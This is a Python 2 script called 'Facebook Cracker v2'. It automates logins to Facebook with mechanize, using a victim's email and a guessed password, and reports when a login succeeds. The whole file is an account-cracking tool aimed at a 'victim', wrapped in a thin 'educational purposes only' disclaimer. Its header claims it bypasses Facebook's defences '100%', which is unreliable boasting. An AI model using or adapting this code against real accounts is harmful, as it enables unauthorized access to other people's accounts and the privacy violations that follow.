#!usr/bin/python
#Facebook Cracker Version 2 can crack into Facebook Database 100% without Interruption By Facebook Firewall !
#This program is for educational purposes only.
#Don't attack people facebook accounts it's illegal ! 
#If you want to crack into someone's account, you must have the permission of the user. 
#Mauritania Attacker is not responsible.
  
  
import sys
import random
import mechanize
import cookielib
  
  
GHT = '''
        +=======================================+
        |..........Facebook Cracker v 2.........|
        +---------------------------------------+
        |#Author: Mauritania Attacker           |
        |#Contact: www.fb.com/mauritanie.forever|
        |#Date: 02/04/2013                      |
        |#This tool is made for pentesting.     |
        |#Changing the Description of this tool |
        |Won't made you the coder ^_^ !!!       |
        |#Respect Coderz ^_^                    |
        |#I take no responsibilities for the    |
        |  use of this program !                |
        +=======================================+
        |..........Facebook Cracker v 2.........|
        +---------------------------------------+
'''
print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
print "# Hit CTRL+C to quit the program"
print "# Use www.graph.facebook.com for more infos about your victim ^_^"
  
  
email = sys.argv[1]
  
useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
  
  
  
login = 'https://www.facebook.com/login.php?login_attempt=1'
def attack(password):
  try:
     sys.stdout.write("\r[*] trying %s.. " % password)
     sys.stdout.flush()
     br.addheaders = [('User-agent', random.choice(useragents))]
     site = br.open(login)
     br.select_form(nr=0)
  
        
     ##Facebook
     br.form['email'] = email
     br.form['pass'] = password
     br.submit()
     log = br.geturl()
     if log.find(login) == -1:
        print "\n\n\n [*] Password found .. !!"
        print "<br>\n [*] Password : %s\n" % (password)
  except KeyboardInterrupt:
        print "\n[*] Exiting program .. "
        sys.exit(1)
  
def check():
    global br
    global passwords
    try:
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
       print "\n[*] Exiting program ..\n"
       sys.exit(1)
    try:

        import time
        start_time = time.time()
        attack(sys.argv[2])
        print("<br>--- %s seconds ---" % (time.time() - start_time))
    except KeyboardInterrupt:
        print "\n [*] Exiting program ..\n"
        sys.exit(1)


import time
start_time = time.time()
check()
print("<br>--- %s seconds ---" % (time.time() - start_time))
